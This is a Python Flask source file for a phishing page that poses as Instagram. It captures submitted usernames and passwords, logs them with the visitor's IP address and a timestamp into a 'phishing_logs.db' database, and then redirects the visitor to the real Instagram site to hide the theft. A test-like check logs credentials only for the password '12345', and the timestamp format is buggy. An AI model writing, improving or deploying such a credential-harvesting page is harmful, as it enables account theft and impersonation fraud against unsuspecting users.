from datetime import datetime
from flask import Flask, request, redirect, render_template

import sqlite3

# conn = sqlite3.connect('phishing_logs.db')
# cursor = conn.cursor()

# cursor.execute("""
# CREATE TABLE IF NOT EXISTS logins (
#                time  TEXT,
#                ip TEXT,
#                username TEXT,
#                password TEXT
#                )
# """)

# conn.commit()

app = Flask("instagram")

@app.route("/")
def index():
    return render_template("index.html")

def is_duplicate(username, password):
    try:
        with open('login.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if username in line and password in line:
                    return True
    except FileNotFoundError:
        return False
    return False


@app.route('/login',  methods=['POST'])
def login():
    conn = sqlite3.connect('phishing_logs.db')
    cursor = conn.cursor()
    username = request.form['username']
    password = request.form['password']
    # if is_duplicate(username, password):
    #     return "User and pass exists"
    if password != "12345":
        error = "password is not correct"
    else:
        ip = request.remote_addr
        time = datetime.now().strftime("%Y-%M-%D %H:%M:%S")
        print(f"{time}- ip:{ip} -username:{username}, password:{password}")
        cursor.execute('''
INSERT INTO logins VALUES (?,?,?,?)
''' , (time, ip, username, password))
        conn.commit()
        
        # with open('login.txt', 'a', encoding='utf-8') as f:
        #     f.write(f"{time}- ip:{ip} -username:{username}, password:{password}")
        return redirect("https://www.instagram.com")
    return render_template('index.html', error=error)


app.run(debug=True)